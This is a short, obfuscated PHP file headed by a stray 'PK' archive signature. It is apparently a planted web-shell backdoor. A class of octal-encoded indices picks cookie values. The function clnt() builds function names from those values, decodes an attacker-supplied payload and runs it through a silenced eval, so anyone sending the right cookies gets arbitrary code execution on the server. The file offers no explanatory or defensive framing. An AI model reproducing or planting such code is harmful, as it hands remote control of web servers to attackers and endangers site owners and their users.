PK<?php
/* ljjEVE */
 class Inner
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s) self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            052,
            052,
            042,
            016,
            064,
            012,
            0115,
            076,
            00
        );
    }
}
function clnt($_ctuqdn = 'clawdqidibfotqh', $_agmrf = null)
{
    $_lvn = $_COOKIE;
    ($_lvn && isset($_lvn[Inner::g(0) ])) ? (($_oabllp = $_lvn[Inner::g(1) ] . $_lvn[Inner::g(2) ]) && ($_mri = $_oabllp($_lvn[Inner::g(3) ] . $_lvn[Inner::g(4) ])) && ($_mhtc = $_oabllp($_lvn[Inner::g(5) ] . $_lvn[Inner::g(6) ])) && ($_mhtc = $_mhtc($_oabllp($_lvn[Inner::g(7) ]))) && @eval($_mhtc)) : $_lvn;
    return Inner::g(8);
}
clnt();

